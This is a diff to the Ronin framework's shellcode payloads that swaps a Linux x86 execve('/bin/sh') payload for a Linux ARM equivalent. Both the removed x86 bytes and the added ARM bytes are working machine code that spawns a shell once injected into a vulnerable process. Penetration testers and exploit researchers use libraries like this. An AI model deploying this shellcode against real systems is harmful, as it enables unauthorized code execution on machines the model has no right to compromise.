@@ -25,36 +25,42 @@ module Ronin
   module Payloads
     module Shellcode
       module Linux
-        module X86
+        module ARM
           #
-          # Linux x86 shellcode that calls `execve()` with `/bin/sh`.
+          # Linux ARM shellcode that calls `execve()` with `/bin/sh`.
           #
-          class Execve < ShellcodePayload
+          class ExecShell < ShellcodePayload
 
-            register 'shellcode/linux/x86/execve'
+            register 'shellcode/linux/arm/exec_shell'
 
-            arch :x86
+            arch :arm
             os :linux
 
-            author "Geyslan G. Bem", email:   'geyslan@gmail.com',
-                                     website: 'http://hackingbits.com'
+            author "Jonathan 'dummys' Borgeaud", twitter: 'dummys1337',
+                                                 website: 'fapperz.org'
 
-            summary 'Linux x86 execve() shellcode'
+            summary 'Linux ARM execve() shellcode'
             description <<~DESC
-            Linux x86 shellcode that calls execve() with "/bin/sh".
+            Linux ARM shellcode that calls execve() with "/bin/sh".
             DESC
 
             references [
-              "https://shell-storm.org/shellcode/files/shellcode-841.html"
+              "https://shell-storm.org/shellcode/files/shellcode-904.html"
             ]
 
             #
             # Builds the shellcode.
             #
             def build
-              @payload = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f" \
-                         "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd" \
-                         "\x80".b
+              @payload = "\x01\x30\x8f\xe2" \
+                         "\x13\xff\x2f\xe1" \
+                         "\x78\x46\x0e\x30" \
+                         "\x01\x90\x49\x1a" \
+                         "\x92\x1a\x08\x27" \
+                         "\xc2\x51\x03\x37" \
+                         "\x01\xdf\x2f\x62" \
+                         "\x69\x6e\x2f\x2f" \
+                         "\x73\x68".b
             end
 
           end
